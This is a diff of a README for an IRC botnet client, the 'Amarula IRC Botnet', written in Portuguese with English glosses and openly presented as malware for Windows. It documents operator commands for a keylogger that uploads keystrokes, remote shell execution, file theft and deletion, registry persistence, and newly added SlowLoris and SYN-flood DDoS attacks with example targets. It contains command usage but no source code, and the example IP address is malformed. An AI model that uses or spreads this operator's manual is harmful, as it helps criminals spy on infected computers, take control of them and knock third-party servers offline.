@@ -1,11 +1,11 @@
-# Amarula IRC Botnet v1.0
-<h4> Abacatch Version </h4>
+# Amarula IRC Botnet v2.1
+<h4> Panama Version </h4>
 
 
 Botnet client feito em **Python 2.7** *(written in Python 2.7)* <br>
 Testado em: **Windows XP, 8, 10**, *(tested on)*<br>
 Escrito por: **Carlos Néri Correia** *(coded by)* <br>
-Versão: **1.0** *(version)*
+Versão: **2.1** *(version)*
 
 ## Como funciona? *(how it works)*
 O Amarula IRC Botnet é um *botnet client* codado em Python 2.7. O malware nada mais é do que um cliente IRC, especialmente construído, que se conecta a um server IRC e entra em um canal como se fosse um usuario comum.
@@ -21,8 +21,10 @@ O Administrador, por sua vez, também estará conectado ao canal, mas através d
 - Upload de arquivos para servidor web via HTTP *(upload bot files to web server)* <br>
 - Envio de logs para servidor remoto *(send logs to remote server)* <br>
 - Deletar arquivos no BOT *(delete files)* <br>
-- Executar arquivos no BOT *(run files)*
+- Executar arquivos no BOT *(run files)*<br>
 - Persistência *(persistence)*<br>
+- Ataques DDoS na camada 7 *(layer 7 DDoS attacks)*<br>
+- Ataques DDoS na camada 4 *(layer 4 DDoS attacks)*<br>
 
 ## Instalação *(install)*
 Faça o download do ZIP ou clone o repositório:
@@ -130,28 +132,58 @@ Diretório para o qual o .exe se copia para ser executado em persistência quand
 		$ USAGE: delete <arquivo> <nickdobot>
 		$ Ex: delete leak.txt DESKTOP-PC-3456
 
-- [start keylog] para ativar o keylogger
+- [keylog start] para ativar o keylogger
   O arquivo de log será upado para o servidor web a cada 100 caracteres digitados. <br>
   Será iniciado um novo processo no sistema do BOT para o keylogger.		
 
-		$ USAGE: keylog start <nickdobot>
+		$ USAGE: keylog start <botnick>
 		$ Ex: keylog start DESKTOP-PC-3456
+		$ Ex: keylog start wave 
 
 
-- [stop keylog] para desativar o keylogger
+- [keylog stop] para desativar o keylogger
 		
-		$ USAGE: keylog stop <nickdobot>
+		$ USAGE: keylog stop <botnick>
 		$ Ex: keylog stop DESKTOP-PC-3456
+		$ Ex: keylog stop wave
+		
+
+- [slow start] para ativar o ataque SlowLoris
+  Ataque DDoS à camada 7 de servidores web com o SlowLoris.
+		
+		$ USAGE: slow start <socket count> <ip> <port> [<botnick> || <wave>]
+		$ Ex: slow start 700 206.285.1.23 80 DESKTOP-PC-3456
+		$ Ex: slow start 700 206.285.1.23 80 wave
+
+- [slow stop] para desativar o SlowLoris
+		
+		$ USAGE: slow stop <botnick> || wave
+		$ Ex: slow stop DESKTOP-PC-3456
+		$ Ex: slow stop wave
+
+- [plum start] para ativar o ataque Syn Flood
+  Ataque DDoS à camada 4 de servidores com o Plum.
+		
+		$ USAGE: plum start  <plum start> <threads> <ip> <port> [<botnick> || <wave>]
+		$ Ex: plum start 10 206.285.1.23 80 DESKTOP-PC-3456
+		$ Ex: plum start 10 206.285.1.23 80 wave
+
+- [plum stop] para desativar o Syn Flood
+		
+		$ USAGE: plum stop <botnick> || wave
+		$ Ex: plum stop DESKTOP-PC-3456
+		$ Ex: plum stop wave
+
 
 - [persistence]   para instalar persistencia no registro do Windows
   Instala a persistencia, iniciando o bot toda vez que o PC do cliente iniciar <br>
 		
-		$ USAGE: persistence <nickdobot>
+		$ USAGE: persistence <botnick>
 		$ Ex: persistence DESKTOP-PC-3456
 
 - [shell] para executar comandos no terminal.
 		
-		$ USAGE: shell <comando> <nickdobot>
+		$ USAGE: shell <comando> <botnick>
 		$ Ex: shell echo HACKED hack.txt && DIR hack.txt DESKTOP-PC-3456
 		
 - [sair] para que os bots ativos saiam do canal <br>
